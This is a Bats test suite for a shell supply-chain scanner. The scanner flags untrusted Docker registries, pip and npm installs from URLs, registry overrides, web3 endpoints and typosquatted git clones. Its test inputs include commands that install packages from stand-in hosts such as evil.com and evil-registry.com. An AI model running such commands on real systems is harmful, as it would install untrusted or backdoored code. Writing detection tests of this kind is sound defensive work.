#!/usr/bin/env bats

# =============================================================================
# Tests for MAINFRAME/lib/tirith_ecosystem.sh
# Supply Chain Security Detection Rules
# =============================================================================

setup() {
    source "${BATS_TEST_DIRNAME}/../lib/tirith_inject.sh"  # for shared state
    source "${BATS_TEST_DIRNAME}/../lib/tirith_ecosystem.sh"
    # Reset state before each test to prevent pollution.
    # _tirith_init_state uses a declare-guard so it only runs once;
    # we must reset the globals manually.
    _TIRITH_FINDINGS=()
    _TIRITH_CRITICAL=0
    _TIRITH_HIGH=0
    _TIRITH_MEDIUM=0
    _TIRITH_LOW=0
}

# =============================================================================
# RULE 1: DOCKER UNTRUSTED REGISTRY  (tirith_check_docker_registry)
# =============================================================================

@test "docker_registry: detects untrusted registry in docker pull" {
    run tirith_check_docker_registry "docker pull evil-registry.com/image:latest"
    [[ $status -eq 0 ]]
}

@test "docker_registry: populates finding for untrusted registry" {
    tirith_check_docker_registry "docker pull evil-registry.com/image:latest"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
    [[ $_TIRITH_MEDIUM -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"DockerUntrustedRegistry"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"evil-registry.com"* ]]
}

@test "docker_registry: Docker Hub image (no prefix) is trusted" {
    run tirith_check_docker_registry "docker pull nginx:latest"
    [[ $status -eq 1 ]]
}

@test "docker_registry: Docker Hub image leaves findings empty" {
    tirith_check_docker_registry "docker pull nginx:latest" || true
    [[ ${#_TIRITH_FINDINGS[@]} -eq 0 ]]
}

@test "docker_registry: ghcr.io is trusted" {
    run tirith_check_docker_registry "docker pull ghcr.io/owner/image:latest"
    [[ $status -eq 1 ]]
}

@test "docker_registry: mcr.microsoft.com is trusted" {
    run tirith_check_docker_registry "docker pull mcr.microsoft.com/dotnet/sdk:8.0"
    [[ $status -eq 1 ]]
}

@test "docker_registry: detects untrusted registry in docker run" {
    run tirith_check_docker_registry "docker run -d evil.io/app:1.0"
    [[ $status -eq 0 ]]
}

@test "docker_registry: docker run finding contains registry name" {
    tirith_check_docker_registry "docker run -d evil.io/app:1.0"
    [[ "${_TIRITH_FINDINGS[0]}" == *"evil.io"* ]]
}

@test "docker_registry: detects untrusted FROM in Dockerfile" {
    run tirith_check_docker_registry "FROM evil-registry.com/base:latest"
    [[ $status -eq 0 ]]
}

@test "docker_registry: FROM finding contains registry name" {
    tirith_check_docker_registry "FROM evil-registry.com/base:latest"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"evil-registry.com"* ]]
}

@test "docker_registry: FROM scratch is clean" {
    run tirith_check_docker_registry "FROM scratch"
    [[ $status -eq 1 ]]
}

@test "docker_registry: empty input returns clean" {
    run tirith_check_docker_registry ""
    [[ $status -eq 1 ]]
}

# =============================================================================
# RULE 2: PIP URL INSTALL  (tirith_check_pip_url_install)
# =============================================================================

@test "pip_url_install: detects pip install from https URL" {
    run tirith_check_pip_url_install "pip install https://evil.com/package.tar.gz"
    [[ $status -eq 0 ]]
}

@test "pip_url_install: finding contains URL and rule ID" {
    tirith_check_pip_url_install "pip install https://evil.com/package.tar.gz"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
    [[ $_TIRITH_MEDIUM -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"PipUrlInstall"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"evil.com"* ]]
}

@test "pip_url_install: detects pip3 install from git+https URL" {
    run tirith_check_pip_url_install "pip3 install git+https://github.com/user/repo"
    [[ $status -eq 0 ]]
}

@test "pip_url_install: git URL finding contains git+ prefix" {
    tirith_check_pip_url_install "pip3 install git+https://github.com/user/repo"
    [[ "${_TIRITH_FINDINGS[0]}" == *"PipUrlInstall"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"git+"* ]]
}

@test "pip_url_install: detects non-PyPI index-url" {
    run tirith_check_pip_url_install "pip install --index-url https://evil.com/simple/ package"
    [[ $status -eq 0 ]]
}

@test "pip_url_install: index-url finding mentions PyPI bypass" {
    tirith_check_pip_url_install "pip install --index-url https://evil.com/simple/ package"
    [[ "${_TIRITH_FINDINGS[0]}" == *"PipUrlInstall"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"evil.com"* ]]
}

@test "pip_url_install: normal pip install is clean" {
    run tirith_check_pip_url_install "pip install requests"
    [[ $status -eq 1 ]]
}

@test "pip_url_install: empty input returns clean" {
    run tirith_check_pip_url_install ""
    [[ $status -eq 1 ]]
}

# =============================================================================
# RULE 3: NPM URL INSTALL  (tirith_check_npm_url_install)
# =============================================================================

@test "npm_url_install: detects npm install from https URL" {
    run tirith_check_npm_url_install "npm install https://evil.com/pkg.tgz"
    [[ $status -eq 0 ]]
}

@test "npm_url_install: URL finding contains rule ID and domain" {
    tirith_check_npm_url_install "npm install https://evil.com/pkg.tgz"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
    [[ $_TIRITH_MEDIUM -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"NpmUrlInstall"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"evil.com"* ]]
}

@test "npm_url_install: detects npm install from git+ URL" {
    run tirith_check_npm_url_install "npm install git+https://github.com/user/repo"
    [[ $status -eq 0 ]]
}

@test "npm_url_install: git URL finding contains git+ prefix" {
    tirith_check_npm_url_install "npm install git+https://github.com/user/repo"
    [[ "${_TIRITH_FINDINGS[0]}" == *"git+"* ]]
}

@test "npm_url_install: detects github: shorthand" {
    run tirith_check_npm_url_install "npm install github:evil/package"
    [[ $status -eq 0 ]]
}

@test "npm_url_install: github shorthand finding mentions GitHub" {
    tirith_check_npm_url_install "npm install github:evil/package"
    [[ "${_TIRITH_FINDINGS[0]}" == *"GitHub shorthand"* ]]
}

@test "npm_url_install: detects non-standard registry override" {
    run tirith_check_npm_url_install "npm config set registry https://evil.com/npm"
    [[ $status -eq 0 ]]
}

@test "npm_url_install: registry override finding mentions non-standard" {
    tirith_check_npm_url_install "npm config set registry https://evil.com/npm"
    [[ "${_TIRITH_FINDINGS[0]}" == *"non-standard"* ]]
}

@test "npm_url_install: normal npm install is clean" {
    run tirith_check_npm_url_install "npm install express"
    [[ $status -eq 1 ]]
}

@test "npm_url_install: empty input returns clean" {
    run tirith_check_npm_url_install ""
    [[ $status -eq 1 ]]
}

# =============================================================================
# RULE 4: WEB3 RPC ENDPOINT  (tirith_check_web3_rpc)
# =============================================================================

@test "web3_rpc: detects infura.io provider" {
    run tirith_check_web3_rpc "curl https://mainnet.infura.io/v3/abc123"
    [[ $status -eq 0 ]]
}

@test "web3_rpc: infura finding contains provider name and low severity" {
    tirith_check_web3_rpc "curl https://mainnet.infura.io/v3/abc123"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
    [[ $_TIRITH_LOW -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"Web3RpcEndpoint"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"infura.io"* ]]
}

@test "web3_rpc: detects alchemy.com provider" {
    tirith_check_web3_rpc "https://eth-mainnet.g.alchemy.com/v2/key123"
    [[ "${_TIRITH_FINDINGS[0]}" == *"alchemy.com"* ]]
}

@test "web3_rpc: clean input without web3 endpoints" {
    run tirith_check_web3_rpc "curl https://api.example.com/v1/data"
    [[ $status -eq 1 ]]
}

@test "web3_rpc: empty input returns clean" {
    run tirith_check_web3_rpc ""
    [[ $status -eq 1 ]]
}

# =============================================================================
# RULE 5: WEB3 ADDRESS IN URL  (tirith_check_web3_address)
# =============================================================================

@test "web3_address: detects Ethereum address (40 hex chars)" {
    run tirith_check_web3_address "https://etherscan.io/address/0x742d35Cc6634C0532925a3b844Bc9e7595f2bD45"
    [[ $status -eq 0 ]]
}

@test "web3_address: finding contains address and low severity" {
    tirith_check_web3_address "https://etherscan.io/address/0x742d35Cc6634C0532925a3b844Bc9e7595f2bD45"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
    [[ $_TIRITH_LOW -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"Web3AddressInUrl"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"0x742d35Cc6634C0532925a3b844Bc9e7595f2bD45"* ]]
}

@test "web3_address: short hex string (not 40 chars) is clean" {
    run tirith_check_web3_address "value is 0x1234abcd"
    [[ $status -eq 1 ]]
}

@test "web3_address: empty input returns clean" {
    run tirith_check_web3_address ""
    [[ $status -eq 1 ]]
}

# =============================================================================
# RULE 6: GIT TYPOSQUAT  (tirith_check_git_typosquat)
# =============================================================================

@test "git_typosquat: detects typosquatted repo (edit distance 1)" {
    source "${BATS_TEST_DIRNAME}/../lib/fuzzy.sh" 2>/dev/null || skip "fuzzy.sh not available"

    # "torvalds/lunix" is distance 1 from "torvalds/linux"
    run tirith_check_git_typosquat "git clone https://github.com/torvalds/lunix.git"
    [[ $status -eq 0 ]]
}

@test "git_typosquat: finding references popular repo name" {
    source "${BATS_TEST_DIRNAME}/../lib/fuzzy.sh" 2>/dev/null || skip "fuzzy.sh not available"

    tirith_check_git_typosquat "git clone https://github.com/torvalds/lunix.git"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"GitTyposquat"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"torvalds/linux"* ]]
}

@test "git_typosquat: exact match is clean (not a typosquat)" {
    source "${BATS_TEST_DIRNAME}/../lib/fuzzy.sh" 2>/dev/null || skip "fuzzy.sh not available"

    run tirith_check_git_typosquat "git clone https://github.com/torvalds/linux.git"
    [[ $status -eq 1 ]]
}

@test "git_typosquat: completely different repo is clean" {
    source "${BATS_TEST_DIRNAME}/../lib/fuzzy.sh" 2>/dev/null || skip "fuzzy.sh not available"

    run tirith_check_git_typosquat "git clone https://github.com/mycompany/myproject.git"
    [[ $status -eq 1 ]]
}

@test "git_typosquat: returns clean when levenshtein_distance not available" {
    # Ensure the function is not defined
    unset -f levenshtein_distance 2>/dev/null || true

    run tirith_check_git_typosquat "git clone https://github.com/torvalds/lunix.git"
    [[ $status -eq 1 ]]
}

# =============================================================================
# COMPOSITE: tirith_scan_ecosystem
# =============================================================================

@test "scan_ecosystem: returns 0 when findings detected" {
    run tirith_scan_ecosystem "pip install https://evil.com/backdoor.tar.gz"
    [[ $status -eq 0 ]]
}

@test "scan_ecosystem: returns 1 when clean" {
    run tirith_scan_ecosystem "ls -la /tmp"
    [[ $status -eq 1 ]]
}

@test "scan_ecosystem: populates findings for untrusted docker pull" {
    tirith_scan_ecosystem "docker pull evil-registry.com/image:latest"
    [[ ${#_TIRITH_FINDINGS[@]} -ge 1 ]]
    [[ $_TIRITH_MEDIUM -ge 1 ]]
}

@test "scan_ecosystem: clean command produces no findings" {
    tirith_scan_ecosystem "echo hello world" || true
    [[ ${#_TIRITH_FINDINGS[@]} -eq 0 ]]
    [[ $_TIRITH_CRITICAL -eq 0 ]]
    [[ $_TIRITH_HIGH -eq 0 ]]
    [[ $_TIRITH_MEDIUM -eq 0 ]]
    [[ $_TIRITH_LOW -eq 0 ]]
}

@test "scan_ecosystem: passes source parameter through to findings" {
    tirith_scan_ecosystem "docker pull evil-registry.com/img:1" "Dockerfile:42"
    local entry="${_TIRITH_FINDINGS[0]}"
    [[ "$entry" == "Dockerfile:42"$'\x1f'* ]]
}
